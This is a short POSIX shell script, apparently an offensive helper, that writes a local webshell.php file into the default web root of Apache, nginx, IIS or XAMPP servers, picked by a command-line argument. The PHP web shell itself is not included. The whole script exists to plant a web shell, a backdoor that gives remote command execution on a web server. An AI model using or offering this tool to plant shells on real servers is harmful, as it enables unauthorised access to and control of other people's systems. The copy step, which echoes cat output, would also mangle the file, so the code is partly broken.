#! /bin/sh

# author: Nullable

usage() {
	echo "\nUsage: webshell <type>\n\ntype = {apache | nginx | iis | xampp}"
	exit
}

main() {

	if test $# -lt 1; then
		usage
	fi

	web_rootdir=""
	if test $1 = "apache"; then
		web_rootdir="/var/www/html/webshell.php"
	elif test $1 = "nginx"; then 
		web_rootdir="/usr/local/nginx/html/webshell.php"
	elif test $1 = "iis"; then 
		web_rootdir="C:\\inetpub\\wwwroot\\webshell.php"
	elif test $1 = "xampp"; then 
		web_rootdir="C:\\xampp\\htdocs\\webshell.php"
	else
		usage
	fi
	
	echo $(cat "./webshell.php") > $web_rootdir
}

main $@
